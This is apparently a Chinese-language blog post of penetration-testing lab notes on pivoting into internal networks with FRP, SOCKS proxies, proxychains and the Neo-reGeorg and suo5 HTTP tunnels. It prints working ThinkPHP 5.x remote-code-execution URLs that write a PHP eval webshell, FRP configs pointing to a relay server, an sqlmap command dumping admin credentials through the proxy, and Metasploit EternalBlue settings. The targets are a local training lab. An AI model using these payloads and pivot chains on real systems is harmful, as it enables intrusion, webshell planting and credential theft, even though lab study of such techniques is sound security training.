---
title: "内网代理与隧道技术"
permalink: intranet-proxy-tunnels/
date: 2026-01-21 01:22:22
categories:
  - 网络安全
  - 内网渗透
tags:
  - 代理隧道
  - FRP
  - 内网渗透
img: /medias/featureimages/17.jpg
summary: "FRP/NPS/reGeorg 等代理工具的配置用法，以及 DNS/ICMP/SSH 等隧道出网的手法。"
---

<!-- more -->

## 内网靶场搭建

添加两个 网络：vmnet 3 192.168.22.0（⚠️改子网IP）

vmnet 4 192.168.33.0 （⚠️改子网IP）

`**⚠️**** 将主机虚拟适配器连接到此网络（取消勾选）**`

## 打开虚拟机
**双击每个⼦⽂件夹中的 .vmx ⽂件即可导⼊虚拟机**

## DMZ ⼊⼝点配置
看⼀下⾃⼰⼊⼝点的ip地址 （ens33 ⽹卡地址）

如果默认的桥接模式发现没有 ip 地址，就可以把桥接改为 NAT

`**浏览器访问 ens33 192.168.79.130 ⽹卡 ip 看到⻚⾯即可成功**`

## 配置宝塔访问 /a768f109/
访问 /a768f109/

账号：eaj3yhsl

密码：41bb8fee

### 前期打点 ：历史漏洞 thinkphp
攻击处在DMZ区，能够被互联网直接访问到的网站或服务。（信息收集、漏洞扫描、漏洞挖掘、历史漏洞）

5.0.22/5.1.29 远程代码执行漏洞

访问：`http://192.168.79.130/public/index.php`

`**http://192.168.79.130/public/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1**`

#### 写 webshell
`**http://192.168.79.130/public/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][0]=shell.php&vars[1][1]=<?php @eval($_POST['a']);?>**`

`**http://192.168.79.130/public/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][0]=echo '<?php @eval($_POST[a]);?>' > sd.php**`

### ip 地址信息收集
#### c段扫描，fscan 、 kscan

##### http 是无状态的，所以不在命令行显示

##### `尝试访问：192.168.22.22`
antsword 上传⼤⼯具怎么防⽌超时？

##
#### `netstat   -anltup`

## 内网代理隧道
## 代理、穿透
## 1️⃣端⼝转发（端⼝映射）
TCP 或 UDP 传输层的转发 ： socket 端⼝转发

端⼝转发⼯具：frp

`https://github.com/fatedier/frp/releases/tag/v0.48.0`

### FRP服务端 FRPS
配置⽂件 frps.ini 内容：

**运行前：chmod   +x   ，赋予执行权限**

```plain
[common]
bind_port = 7000
token = hanclashno

token 可以自己随意写
./frps -c frps.ini  运行
```

### FRP客户端 FRPC
配置⽂件 frpc.ini

#### 运行前：chmod   +x   ，赋予执行权限
```plain
[common]
server_addr = 101.42.20.101
server_port = 7000
token = hanclashno

[ssh]
type = tcp
local_ip = 127.0.0.1
local_port = 22
remote_port = 10000

[python]
type = tcp
local_ip = 127.0.0.1
local_port = 8000
remote_port = 10000

./frpc -c frpc.ini  运行
```

⚠ 作⽤：把本地的 8000 端⼝转发给 10000 端⼝

⚠ 如果想如同笔记⼀样，转发8000端⼝，那本地的8000端⼝⼀定要开，即

`**python   -m  http.server**`

#### 转发⾃⼰ kali 的 22 端⼝到公⽹
```plain
[common]
bind_port = 7000
token = hanclashno
```

```plain
[common]
server_addr = 101.42.20.101
server_port = 7000
token = hanclashno

[ssh]
type = tcp
local_ip = 127.0.0.1
local_port = 22
remote_port = 10000

[python]
type = tcp
local_ip = 127.0.0.1
local_port = 8000
remote_port = 10000
```

`ssh root@101.42.20.101 -p 10000`

## 2️⃣ Socks 代理
应⽤层 socks 协议： 防⽕墙穿透协议，默认 1080 端⼝

+ socks5
+ socks4a
+ socks4 （就是 HTTP 代理）

#### frp 是反向代理工具
frp是一个专注于内网穿透的高性能的反向代理应用

### frp操作 ⼀级代理
构建通向 192.168.22.0 ⽹段的代理

#### frps
```plain
[common]
bind_port = 7000
token = hanclashno
```

#### frpc
⚠️ **chmod  +x  赋权**

```plain
[common]
server_addr = 101.42.20.101
server_port = 7000
token = hanclashno

[socks_proxy_to_192.168.22.x]
type = tcp
plugin = socks5
remote_port = 10080
```

作⽤：在云服务器上开启 10022 端⼝作为通向 192.168.22.x ⽹段 socks 代理服务

### 连接代理 （zero omega）

### 通过代理访问到 192.168.22.22

### 连接代理 （sqlmap）
`sqlmap -u "http://192.168.22.22/index.php?r=vul&keyword=1" --proxy=socks5://101.42.20.101:10080 -D bagecms -T bage_admin -C username,password --dump`

**用户名：admin**

**密码：123qwe**

### 连接代理 （dirsearch）
`python dirsearch.py -p **socks5://101.42.20.101:10080** -u "http://192.168.22.22" `

`http://192.168.22.22/index.php?r=admini`

`http://192.168.22.22/index.php?r=admini/public/login`

### 连接代理 （antsword）

URL：`**http://192.168.22.22/index.php**`

password：`**pass**`

### frp操作 ⼆级代理
启动顺序是从左向右依次启动

```plain
[common]
bind_port = 7000
token = hanclashno
```

```plain
[common]
server_addr = 101.42.20.101
server_port = 7000
token = hanclashno

[socks_proxy_to_192.168.22.x]
type = tcp
plugin = socks5
remote_port = 10080

[pfw_10033_to_vps]
type = tcp
local_ip = 127.0.0.1
local_port = 10033
remote_port = 10033
```

```plain
[common]
bind_port = 7000
token = hanclashno
```

```plain
[common]
server_addr = 192.168.22.11
server_port = 7000
token = hanclashno

[socks_proxy_to_192.168.33.x]
type = tcp
plugin = socks5
remote_port = 10033
```

#### fscan 扫描

NetBIOS（网络基本输入输出系统）是一种老式的 API 和协议，主要用于局域网内设备之间的通信（如文件共享、打印机共享）

### 连接代理 （proxychains）
#### 配置⽂件在 `/etc/proxychains4.conf`
proxychains 类似于 windows proxifier 的代理分流⼯具， 配置⽂件在 `/etc/proxychains4.conf`

#### nmap ⾛代理扫描端⼝
`proxychains nmap -sT -Pn 192.168.33.33 -p445`

`**-Pn**` 扫描前不用ping，直接开扫(nmap默认情况下，扫描前需要是否能ping通，如果ping不通，

就忽略了)

### 连接代理 （metasploit）
msf 连接代理使⽤永恒之蓝攻击 192.168.33.33

`set payload windows/x64/meterpreter/bind_tcp`

`set proxies socks5:101.42.20.101:10033`

`set proxies socks5:代理IP:代理端⼝`

#### 攻击成功

## 3️⃣ 基于HTTP 隧道的 正向 socks 代理
场景：边界区的机器不能联网 （不出网）严苛条件下使用

之前使用的 frp 反向代理，是把 frps 开在了公网的云服务器上，但边界区的机器连接不到公网， frps 则失去作用

### Neo-reGeorg
[https://github.com/L-codes/Neo-reGeorg](https://github.com/L-codes/Neo-reGeorg)

#### 生成转发用的webshell
 生成 webshell 时需要指定密码 ， 生成的webshell 会保存在 neoreg_servers 目录下

`python  neoreg.py  generate  -k  123456`

####  上传 tunnel 文件

####  访问测试 （访问空白即为成功）

####  开启 socks代理
`python neoreg.py -k 123456 -u http://192.168.79.130/public/tunnel.php`

####  使用 socks 代理访问内网

###  suo5
[https://github.com/zema1/suo5](https://github.com/zema1/suo5)

[https://github.com/zema1/suo5/tree/main/assets](https://github.com/zema1/suo5/tree/main/assets)

#### 上传 suo5.php

#### 访问测试

####  开启 socks代 理

## 概念
## 正向代理
### 代理客户端、隐藏客户端
### 应用场景：
秒播代理、科学上网、游戏加速

## 反向代理
### 代理服务器、隐藏服务器
### 应用场景：
负载均衡、WAF

## VPN 虚拟专用网
虚拟专用网， VPN 不是 socks 代理

## socket 端口转发 不是代理
端口转发 不是代理，**代理是socks 代理， 工作在应用层**；端口转发是工作在传输层的 TCP 或 UDP （TCP 和 UDP 的统称就是 socket）

## 透明代理
**代理对 客户端来说是透明的，无感知的，客户端并不知道自己使用了代理**
